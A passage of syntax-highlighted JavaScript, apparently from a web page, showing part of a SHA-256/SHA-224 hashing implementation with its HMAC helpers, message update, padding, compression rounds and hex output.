function_">createHash</span>(algorithm).<span class="title function_">update</span>(message, <span class="string">'utf8'</span>).<span class="title function_">digest</span>(<span class="string">'hex'</span>)</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        <span class="keyword">if</span> (message === <span class="literal">null</span> || message === <span class="literal">undefined</span>) {</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">                        } <span class="keyword">else</span> <span class="keyword">if</span> (message.<span class="property">constructor</span> === <span class="title class_">ArrayBuffer</span>) {</span><br><span class="line">                            message = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(message)</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(message) || <span class="title class_">ArrayBuffer</span>.<span class="title function_">isView</span>(message) || message.<span class="property">constructor</span> === <span class="title class_">Buffer</span>) {</span><br><span class="line">                        <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(algorithm).<span class="title function_">update</span>(<span class="keyword">new</span> <span class="title class_">Buffer</span>(message)).<span class="title function_">digest</span>(<span class="string">'hex'</span>)</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        <span class="keyword">return</span> <span class="title function_">method</span>(message)</span><br><span class="line">                    }</span><br><span class="line">                };</span><br><span class="line">            <span class="keyword">return</span> nodeMethod</span><br><span class="line">        };</span><br><span class="line">    <span class="keyword">var</span> createHmacOutputMethod = <span class="keyword">function</span>(<span class="params">outputType, is224</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">key, message</span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HmacSha256</span>(key, is224, <span class="literal">true</span>).<span class="title function_">update</span>(message)[outputType]()</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line">    <span class="keyword">var</span> createHmacMethod = <span class="keyword">function</span>(<span class="params">is224</span>) {</span><br><span class="line">            <span class="keyword">var</span> method = <span class="title function_">createHmacOutputMethod</span>(<span class="string">'hex'</span>, is224);</span><br><span class="line">            method.<span class="property">create</span> = <span class="keyword">function</span>(<span class="params">key</span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HmacSha256</span>(key, is224)</span><br><span class="line">            };</span><br><span class="line">            method.<span class="property">update</span> = <span class="keyword">function</span>(<span class="params">key, message</span>) {</span><br><span class="line">                <span class="keyword">return</span> method.<span class="title function_">create</span>(key).<span class="title function_">update</span>(message)</span><br><span class="line">            };</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable constant_">OUTPUT_TYPES</span>.<span class="property">length</span>; ++i) {</span><br><span class="line">                <span class="keyword">var</span> type = <span class="variable constant_">OUTPUT_TYPES</span>[i];</span><br><span class="line">                method[type] = <span class="title function_">createHmacOutputMethod</span>(type, is224)</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> method</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Sha256</span>(<span class="params">is224, sharedMemory</span>) {</span><br><span class="line">        <span class="keyword">if</span> (sharedMemory) {</span><br><span class="line">            blocks[<span class="number">0</span>] = blocks[<span class="number">16</span>] = blocks[<span class="number">1</span>] = blocks[<span class="number">2</span>] = blocks[<span class="number">3</span>] = blocks[<span class="number">4</span>] = blocks[<span class="number">5</span>] = blocks[<span class="number">6</span>] = blocks[<span class="number">7</span>] = blocks[<span class="number">8</span>] = blocks[<span class="number">9</span>] = blocks[<span class="number">10</span>] = blocks[<span class="number">11</span>] = blocks[<span class="number">12</span>] = blocks[<span class="number">13</span>] = blocks[<span class="number">14</span>] = blocks[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">blocks</span> = blocks</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">blocks</span> = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (is224) {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h0</span> = <span class="number">0xc1059ed8</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h1</span> = <span class="number">0x367cd507</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h2</span> = <span class="number">0x3070dd17</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h3</span> = <span class="number">0xf70e5939</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h4</span> = <span class="number">0xffc00b31</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h5</span> = <span class="number">0x68581511</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h6</span> = <span class="number">0x64f98fa7</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h7</span> = <span class="number">0xbefa4fa4</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h0</span> = <span class="number">0x6a09e667</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h1</span> = <span class="number">0xbb67ae85</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h2</span> = <span class="number">0x3c6ef372</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h3</span> = <span class="number">0xa54ff53a</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h4</span> = <span class="number">0x510e527f</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h5</span> = <span class="number">0x9b05688c</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h6</span> = <span class="number">0x1f83d9ab</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">h7</span> = <span class="number">0x5be0cd19</span></span><br><span class="line">        }</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">block</span> = <span class="variable language_">this</span>.<span class="property">start</span> = <span class="variable language_">this</span>.<span class="property">bytes</span> = <span class="variable language_">this</span>.<span class="property">hBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">finalized</span> = <span class="variable language_">this</span>.<span class="property">hashed</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">first</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">is224</span> = is224</span><br><span class="line">    }</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">update</span> = <span class="keyword">function</span>(<span class="params">message</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">finalized</span>) {</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">var</span> notString, type = <span class="keyword">typeof</span> message;</span><br><span class="line">        <span class="keyword">if</span> (type !== <span class="string">'string'</span>) {</span><br><span class="line">            <span class="keyword">if</span> (type === <span class="string">'object'</span>) {</span><br><span class="line">                <span class="keyword">if</span> (message === <span class="literal">null</span>) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable constant_">ARRAY_BUFFER</span> &amp;&amp; message.<span class="property">constructor</span> === <span class="title class_">ArrayBuffer</span>) {</span><br><span class="line">                    message = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(message)</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(message)) {</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable constant_">ARRAY_BUFFER</span> || !<span class="title class_">ArrayBuffer</span>.<span class="title function_">isView</span>(message)) {</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="variable constant_">ERROR</span>)</span><br><span class="line">            }</span><br><span class="line">            notString = <span class="literal">true</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">var</span> code, index = <span class="number">0</span>,</span><br><span class="line">            i, length = message.<span class="property">length</span>,</span><br><span class="line">            blocks = <span class="variable language_">this</span>.<span class="property">blocks</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; length) {</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">hashed</span>) {</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">hashed</span> = <span class="literal">false</span>;</span><br><span class="line">                blocks[<span class="number">0</span>] = <span class="variable language_">this</span>.<span class="property">block</span>;</span><br><span class="line">                blocks[<span class="number">16</span>] = blocks[<span class="number">1</span>] = blocks[<span class="number">2</span>] = blocks[<span class="number">3</span>] = blocks[<span class="number">4</span>] = blocks[<span class="number">5</span>] = blocks[<span class="number">6</span>] = blocks[<span class="number">7</span>] = blocks[<span class="number">8</span>] = blocks[<span class="number">9</span>] = blocks[<span class="number">10</span>] = blocks[<span class="number">11</span>] = blocks[<span class="number">12</span>] = blocks[<span class="number">13</span>] = blocks[<span class="number">14</span>] = blocks[<span class="number">15</span>] = <span class="number">0</span></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (notString) {</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="variable language_">this</span>.<span class="property">start</span>; index &lt; length &amp;&amp; i &lt; <span class="number">64</span>; ++index) {</span><br><span class="line">                    blocks[i &gt;&gt; <span class="number">2</span>] |= message[index] &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>]</span><br><span class="line">                }</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="variable language_">this</span>.<span class="property">start</span>; index &lt; length &amp;&amp; i &lt; <span class="number">64</span>; ++index) {</span><br><span class="line">                    code = message.<span class="title function_">charCodeAt</span>(index);</span><br><span class="line">                    <span class="keyword">if</span> (code &lt; <span class="number">0x80</span>) {</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= code &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>]</span><br><span class="line">                    } <span class="keyword">else</span> <span class="keyword">if</span> (code &lt; <span class="number">0x800</span>) {</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0xc0</span> | (code &gt;&gt; <span class="number">6</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>];</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0x80</span> | (code &amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>]</span><br><span class="line">                    } <span class="keyword">else</span> <span class="keyword">if</span> (code &lt; <span class="number">0xd800</span> || code &gt;= <span class="number">0xe000</span>) {</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0xe0</span> | (code &gt;&gt; <span class="number">12</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>];</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0x80</span> | ((code &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>];</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0x80</span> | (code &amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>]</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        code = <span class="number">0x10000</span> + (((code &amp; <span class="number">0x3ff</span>) &lt;&lt; <span class="number">10</span>) | (message.<span class="title function_">charCodeAt</span>(++index) &amp; <span class="number">0x3ff</span>));</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0xf0</span> | (code &gt;&gt; <span class="number">18</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>];</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0x80</span> | ((code &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>];</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0x80</span> | ((code &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>];</span><br><span class="line">                        blocks[i &gt;&gt; <span class="number">2</span>] |= (<span class="number">0x80</span> | (code &amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="variable constant_">SHIFT</span>[i++ &amp; <span class="number">3</span>]</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">lastByteIndex</span> = i;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bytes</span> += i - <span class="variable language_">this</span>.<span class="property">start</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">64</span>) {</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">block</span> = blocks[<span class="number">16</span>];</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">start</span> = i - <span class="number">64</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">hash</span>();</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">hashed</span> = <span class="literal">true</span></span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">start</span> = i</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">bytes</span> &gt; <span class="number">4294967295</span>) {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">hBytes</span> += <span class="variable language_">this</span>.<span class="property">bytes</span> / <span class="number">4294967296</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bytes</span> = <span class="variable language_">this</span>.<span class="property">bytes</span> % <span class="number">4294967296</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span></span><br><span class="line">    };</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">finalize</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">finalized</span>) {</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        }</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">finalized</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">var</span> blocks = <span class="variable language_">this</span>.<span class="property">blocks</span>,</span><br><span class="line">            i = <span class="variable language_">this</span>.<span class="property">lastByteIndex</span>;</span><br><span class="line">        blocks[<span class="number">16</span>] = <span class="variable language_">this</span>.<span class="property">block</span>;</span><br><span class="line">        blocks[i &gt;&gt; <span class="number">2</span>] |= <span class="variable constant_">EXTRA</span>[i &amp; <span class="number">3</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">block</span> = blocks[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">56</span>) {</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">hashed</span>) {</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">hash</span>()</span><br><span class="line">            }</span><br><span class="line">            blocks[<span class="number">0</span>] = <span class="variable language_">this</span>.<span class="property">block</span>;</span><br><span class="line">            blocks[<span class="number">16</span>] = blocks[<span class="number">1</span>] = blocks[<span class="number">2</span>] = blocks[<span class="number">3</span>] = blocks[<span class="number">4</span>] = blocks[<span class="number">5</span>] = blocks[<span class="number">6</span>] = blocks[<span class="number">7</span>] = blocks[<span class="number">8</span>] = blocks[<span class="number">9</span>] = blocks[<span class="number">10</span>] = blocks[<span class="number">11</span>] = blocks[<span class="number">12</span>] = blocks[<span class="number">13</span>] = blocks[<span class="number">14</span>] = blocks[<span class="number">15</span>] = <span class="number">0</span></span><br><span class="line">        }</span><br><span class="line">        blocks[<span class="number">14</span>] = <span class="variable language_">this</span>.<span class="property">hBytes</span> &lt;&lt; <span class="number">3</span> | <span class="variable language_">this</span>.<span class="property">bytes</span> &gt;&gt;&gt; <span class="number">29</span>;</span><br><span class="line">        blocks[<span class="number">15</span>] = <span class="variable language_">this</span>.<span class="property">bytes</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">hash</span>()</span><br><span class="line">    };</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hash</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">var</span> a = <span class="variable language_">this</span>.<span class="property">h0</span>,</span><br><span class="line">            b = <span class="variable language_">this</span>.<span class="property">h1</span>,</span><br><span class="line">            c = <span class="variable language_">this</span>.<span class="property">h2</span>,</span><br><span class="line">            d = <span class="variable language_">this</span>.<span class="property">h3</span>,</span><br><span class="line">            e = <span class="variable language_">this</span>.<span class="property">h4</span>,</span><br><span class="line">            f = <span class="variable language_">this</span>.<span class="property">h5</span>,</span><br><span class="line">            g = <span class="variable language_">this</span>.<span class="property">h6</span>,</span><br><span class="line">            h = <span class="variable language_">this</span>.<span class="property">h7</span>,</span><br><span class="line">            blocks = <span class="variable language_">this</span>.<span class="property">blocks</span>,</span><br><span class="line">            j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">16</span>; j &lt; <span class="number">64</span>; ++j) {</span><br><span class="line">            t1 = blocks[j - <span class="number">15</span>];</span><br><span class="line">            s0 = ((t1 &gt;&gt;&gt; <span class="number">7</span>) | (t1 &lt;&lt; <span class="number">25</span>)) ^ ((t1 &gt;&gt;&gt; <span class="number">18</span>) | (t1 &lt;&lt; <span class="number">14</span>)) ^ (t1 &gt;&gt;&gt; <span class="number">3</span>);</span><br><span class="line">            t1 = blocks[j - <span class="number">2</span>];</span><br><span class="line">            s1 = ((t1 &gt;&gt;&gt; <span class="number">17</span>) | (t1 &lt;&lt; <span class="number">15</span>)) ^ ((t1 &gt;&gt;&gt; <span class="number">19</span>) | (t1 &lt;&lt; <span class="number">13</span>)) ^ (t1 &gt;&gt;&gt; <span class="number">10</span>);</span><br><span class="line">            blocks[j] = blocks[j - <span class="number">16</span>] + s0 + blocks[j - <span class="number">7</span>] + s1 &lt;&lt; <span class="number">0</span></span><br><span class="line">        }</span><br><span class="line">        bc = b &amp; c;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">4</span>) {</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">first</span>) {</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">is224</span>) {</span><br><span class="line">                    ab = <span class="number">300032</span>;</span><br><span class="line">                    t1 = blocks[<span class="number">0</span>] - <span class="number">1413257819</span>;</span><br><span class="line">                    h = t1 - <span class="number">150054599</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">                    d = t1 + <span class="number">24177077</span> &lt;&lt; <span class="number">0</span></span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    ab = <span class="number">704751109</span>;</span><br><span class="line">                    t1 = blocks[<span class="number">0</span>] - <span class="number">210244248</span>;</span><br><span class="line">                    h = t1 - <span class="number">1521486534</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">                    d = t1 + <span class="number">143694565</span> &lt;&lt; <span class="number">0</span></span><br><span class="line">                }</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">first</span> = <span class="literal">false</span></span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                s0 = ((a &gt;&gt;&gt; <span class="number">2</span>) | (a &lt;&lt; <span class="number">30</span>)) ^ ((a &gt;&gt;&gt; <span class="number">13</span>) | (a &lt;&lt; <span class="number">19</span>)) ^ ((a &gt;&gt;&gt; <span class="number">22</span>) | (a &lt;&lt; <span class="number">10</span>));</span><br><span class="line">                s1 = ((e &gt;&gt;&gt; <span class="number">6</span>) | (e &lt;&lt; <span class="number">26</span>)) ^ ((e &gt;&gt;&gt; <span class="number">11</span>) | (e &lt;&lt; <span class="number">21</span>)) ^ ((e &gt;&gt;&gt; <span class="number">25</span>) | (e &lt;&lt; <span class="number">7</span>));</span><br><span class="line">                ab = a &amp; b;</span><br><span class="line">                maj = ab ^ (a &amp; c) ^ bc;</span><br><span class="line">                ch = (e &amp; f) ^ (~e &amp; g);</span><br><span class="line">                t1 = h + s1 + ch + K[j] + blocks[j];</span><br><span class="line">                t2 = s0 + maj;</span><br><span class="line">                h = d + t1 &lt;&lt; <span class="number">0</span>;</span><br><span class="line">                d = t1 + t2 &lt;&lt; <span class="number">0</span></span><br><span class="line">            }</span><br><span class="line">            s0 = ((d &gt;&gt;&gt; <span class="number">2</span>) | (d &lt;&lt; <span class="number">30</span>)) ^ ((d &gt;&gt;&gt; <span class="number">13</span>) | (d &lt;&lt; <span class="number">19</span>)) ^ ((d &gt;&gt;&gt; <span class="number">22</span>) | (d &lt;&lt; <span class="number">10</span>));</span><br><span class="line">            s1 = ((h &gt;&gt;&gt; <span class="number">6</span>) | (h &lt;&lt; <span class="number">26</span>)) ^ ((h &gt;&gt;&gt; <span class="number">11</span>) | (h &lt;&lt; <span class="number">21</span>)) ^ ((h &gt;&gt;&gt; <span class="number">25</span>) | (h &lt;&lt; <span class="number">7</span>));</span><br><span class="line">            da = d &amp; a;</span><br><span class="line">            maj = da ^ (d &amp; b) ^ ab;</span><br><span class="line">            ch = (h &amp; e) ^ (~h &amp; f);</span><br><span class="line">            t1 = g + s1 + ch + K[j + <span class="number">1</span>] + blocks[j + <span class="number">1</span>];</span><br><span class="line">            t2 = s0 + maj;</span><br><span class="line">            g = c + t1 &lt;&lt; <span class="number">0</span>;</span><br><span class="line">            c = t1 + t2 &lt;&lt; <span class="number">0</span>;</span><br><span class="line">            s0 = ((c &gt;&gt;&gt; <span class="number">2</span>) | (c &lt;&lt; <span class="number">30</span>)) ^ ((c &gt;&gt;&gt; <span class="number">13</span>) | (c &lt;&lt; <span class="number">19</span>)) ^ ((c &gt;&gt;&gt; <span class="number">22</span>) | (c &lt;&lt; <span class="number">10</span>));</span><br><span class="line">            s1 = ((g &gt;&gt;&gt; <span class="number">6</span>) | (g &lt;&lt; <span class="number">26</span>)) ^ ((g &gt;&gt;&gt; <span class="number">11</span>) | (g &lt;&lt; <span class="number">21</span>)) ^ ((g &gt;&gt;&gt; <span class="number">25</span>) | (g &lt;&lt; <span class="number">7</span>));</span><br><span class="line">            cd = c &amp; d;</span><br><span class="line">            maj = cd ^ (c &amp; a) ^ da;</span><br><span class="line">            ch = (g &amp; h) ^ (~g &amp; e);</span><br><span class="line">            t1 = f + s1 + ch + K[j + <span class="number">2</span>] + blocks[j + <span class="number">2</span>];</span><br><span class="line">            t2 = s0 + maj;</span><br><span class="line">            f = b + t1 &lt;&lt; <span class="number">0</span>;</span><br><span class="line">            b = t1 + t2 &lt;&lt; <span class="number">0</span>;</span><br><span class="line">            s0 = ((b &gt;&gt;&gt; <span class="number">2</span>) | (b &lt;&lt; <span class="number">30</span>)) ^ ((b &gt;&gt;&gt; <span class="number">13</span>) | (b &lt;&lt; <span class="number">19</span>)) ^ ((b &gt;&gt;&gt; <span class="number">22</span>) | (b &lt;&lt; <span class="number">10</span>));</span><br><span class="line">            s1 = ((f &gt;&gt;&gt; <span class="number">6</span>) | (f &lt;&lt; <span class="number">26</span>)) ^ ((f &gt;&gt;&gt; <span class="number">11</span>) | (f &lt;&lt; <span class="number">21</span>)) ^ ((f &gt;&gt;&gt; <span class="number">25</span>) | (f &lt;&lt; <span class="number">7</span>));</span><br><span class="line">            bc = b &amp; c;</span><br><span class="line">            maj = bc ^ (b &amp; d) ^ cd;</span><br><span class="line">            ch = (f &amp; g) ^ (~f &amp; h);</span><br><span class="line">            t1 = e + s1 + ch + K[j + <span class="number">3</span>] + blocks[j + <span class="number">3</span>];</span><br><span class="line">            t2 = s0 + maj;</span><br><span class="line">            e = a + t1 &lt;&lt; <span class="number">0</span>;</span><br><span class="line">            a = t1 + t2 &lt;&lt; <span class="number">0</span></span><br><span class="line">        }</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h0</span> = <span class="variable language_">this</span>.<span class="property">h0</span> + a &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h1</span> = <span class="variable language_">this</span>.<span class="property">h1</span> + b &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h2</span> = <span class="variable language_">this</span>.<span class="property">h2</span> + c &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h3</span> = <span class="variable language_">this</span>.<span class="property">h3</span> + d &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h4</span> = <span class="variable language_">this</span>.<span class="property">h4</span> + e &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h5</span> = <span class="variable language_">this</span>.<span class="property">h5</span> + f &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h6</span> = <span class="variable language_">this</span>.<span class="property">h6</span> + g &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h7</span> = <span class="variable language_">this</span>.<span class="property">h7</span> + h &lt;&lt; <span class="number">0</span></span><br><span class="line">    };</span><br><span class="line">    <span class="title class_">Sha256</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hex</span> = <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">finalize</span>();</span><br><span class="line">        <span class="keyword">var</span> h0 = <span class="variable language_">this</span>.<span class="property">h0</span>,</span><br><span class="line">            h1 = <span class="variable language_">this</span>.<span class="property">h1</span>,</span><br><span class="line">            h2 = <span class="variable language_">this</span>.<span class="property">h2</span>,</span><br><span class="line">            h3 = <span class="variable language_">this</span>.<span class="property">h3</span>,</span><br><span class="line">            h4 = <span class="variable language_">this</span>.<span class="property">h4</span>,</span><br><span class="line">            h5 = <span class="variable language_">this</span>.<span class="property">h5</span>,</span><br><span class="line">            h6 = <span class="variable language_">this</span>.<span class="property">h6</span>,</span><br><span class="line">            h7 = <span class="variable language_">this</span>.<span class="property">h7</span>;</span><br><span class="line">        <span class="keyword">var</span> hex = <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[h0 &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x0F</span>] + <span class="variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>] + <span class="variable 